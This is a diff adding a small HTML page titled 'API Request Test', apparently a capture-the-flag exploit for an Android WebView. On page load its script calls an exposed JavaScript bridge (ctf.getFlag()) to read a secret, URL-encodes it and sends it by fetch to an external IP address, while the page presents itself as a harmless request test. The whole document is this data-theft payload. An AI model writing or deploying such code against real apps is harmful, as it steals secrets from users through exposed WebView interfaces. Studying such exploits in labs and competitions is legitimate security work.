@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>API Request Test</title>
+</head>
+<body>
+    <h1>API Request Test</h1>
+    <p>Check the console for request status</p>
+
+    <script>
+        window.onload = function() {
+            // Get flag from Android interface
+            const flag = ctf.getFlag();
+            console.log('Got flag:', flag);
+            
+            // Encode flag for URL
+            const encodedFlag = encodeURIComponent(flag);
+            console.log('Encoded flag:', encodedFlag);
+            
+            // Make request with encoded flag
+            fetch('http://155.138.131.52:8080/items/' + encodedFlag, {
+                method: 'GET'
+            })
+            .then(response => {
+                console.log('Request sent successfully');
+                console.log('Response:', response);
+                return response.json();
+            })
+            .then(data => {
+                console.log('Data:', data);
+            })
+            .catch(error => {
+                console.error('Error sending request:', error);
+            });
+        };
+    </script>
+</body>
+</html> 
